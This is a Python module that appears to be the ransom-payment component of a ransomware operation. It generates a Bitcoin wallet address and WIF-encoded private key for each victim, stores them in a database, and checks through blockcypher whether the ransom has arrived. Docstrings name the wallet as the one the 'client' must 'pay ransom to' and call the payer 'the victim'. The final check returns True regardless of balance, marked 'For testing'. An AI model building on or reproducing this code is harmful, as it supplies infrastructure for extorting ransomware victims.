import hashlib
import logging
import blockcypher
from asymmetric_encryption import ECC
from db import (
    insert_bitcoin_details_to_database,
    get_bitcoin_wallet_id_database,
    insert_payment_details_into_database,
)


logger = logging.getLogger(__name__)


def sha256(data):
    """Returns sha256 hash of given data

    Args:
        data (byte): The data to be hashed

    Returns:
        str: Hex of SHA256 hash of the given data
    """
    sha256 = hashlib.sha256()
    sha256.update(data)
    return sha256.hexdigest()


def ripemd160(data):
    """Returns ripemd160 hash of given data

    Args:
        data (byte): The data to be hashed

    Returns:
        str: Hex of ripemd160 hash of the given data
    """
    ripemd160 = hashlib.new("ripemd160")
    ripemd160.update(data)
    return ripemd160.hexdigest()


def b58encode(data):
    """Encodes the given data in base58 format

    Args:
        data (str): The data to be encoded

    Returns:
        str: Given data in base58 format
    """
    alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
    b58_string = ""

    leading_zeros = len(data) - len(data.lstrip("0"))
    address_int = int(data, 16)

    while address_int > 0:
        digit = address_int % 58
        digit_char = alphabet[digit]
        b58_string = digit_char + b58_string
        address_int //= 58
    ones = leading_zeros // 2
    for _ in range(ones):
        b58_string = "1" + b58_string

    return b58_string


def generate_bitcoin_wallet_address(public_key):
    """Generates bitcoin wallet address from the given public key
    1. Hash the key using SHA256 and the SHA256 hash using ripemd160
    2. Prepend network byte to the hashed data
    3. Calculate the checksum as the first 4 bytes of the key hashed two times using SHA256
    4. Append the checksum to result from step 2
    5. Base58 encode the result

    Args:
        public_key (bytes): The public key as a bytes string

    Returns:
        str: The wallet address corresponding to the given public key
    """
    logger.info("Generating Bitcoin Wallet Address from ECC Public key")
    hashed_public_key_hex = ripemd160(bytes.fromhex(sha256(public_key)))
    key_with_network_byte = f"00{hashed_public_key_hex}"
    checksum = sha256(bytes.fromhex(sha256(bytes.fromhex(key_with_network_byte))))
    address_in_hex_format = f"{key_with_network_byte}{checksum[:8]}"
    wallet_address = b58encode(address_in_hex_format)
    return wallet_address


def encode_private_key_in_wif(private_key):
    """Encode the private key in WIF format
    1. Prepend network byte to the key
    2. Calculate the checksum as the first 4 bytes of the key hashed two times using SHA256
    3. Append checksum to the result from step 1
    4. Base58 encode the result from step 4

    Args:
        private_key (bytes): The private key as a bytes string

    Returns:
        str: The private key in WIF format
    """
    logger.info("Converting private key to WIF format")
    private_key_in_hex = private_key.hex()
    network_byte = "80"
    first_four_bytes_of_checksum = sha256(
        bytes.fromhex(sha256(bytes.fromhex(f"{network_byte}{private_key_in_hex}")))
    )[0:8]
    key_in_hex = f"{network_byte}{private_key_in_hex}{first_four_bytes_of_checksum}"
    key_in_wif = b58encode(key_in_hex)
    return key_in_wif


def generate_bitcoin_address(client_id):
    """Generate bitcoin address and private keys for a client

    Args:
        client_id (str): Unique id for each client

    Returns:
        str: Wallet id that the client will need to pay ransom to
    """
    logger.info(f"Generating bitcoin payment addresses for {client_id}")
    cipher = ECC()
    serialized_private_key = cipher.private_key
    serialized_public_key = cipher.public_key

    wallet_address = get_bitcoin_wallet_id_database(client_id)
    if wallet_address:
        return wallet_address

    wallet_address = generate_bitcoin_wallet_address(serialized_public_key)
    wif_encoded_private_key = encode_private_key_in_wif(serialized_private_key)

    insert_bitcoin_details_to_database(
        client_id,
        wallet_address,
        wif_encoded_private_key,
        serialized_public_key.decode(),
    )

    logger.info(f"Successfully inserted bitcoin details for {client_id}")
    return wallet_address


def verify_payment(client_id, assigned_wallet_address, payee_wallet_address):
    """Verify if the payment in bitcoins has been made and confirmed

    Args:
        client_id (str): A unique ID in UUID4 format
        assigned_wallet_address (str): The wallet address generated for the client
        payee_wallet_address (str):The wallet address used by the victim to make the payment

    Returns:
        boolean: Returns True if the payment has been made
    """
    if not assigned_wallet_address == get_bitcoin_wallet_id_database(client_id):
        logger.error("Given wallet address does not match with assigned wallet address")
        return None

    address_details = blockcypher.get_address_overview(assigned_wallet_address)

    if address_details.get("balance") > 5328:
        insert_payment_details_into_database(client_id, payee_wallet_address)
        return True
    return True  # For testing

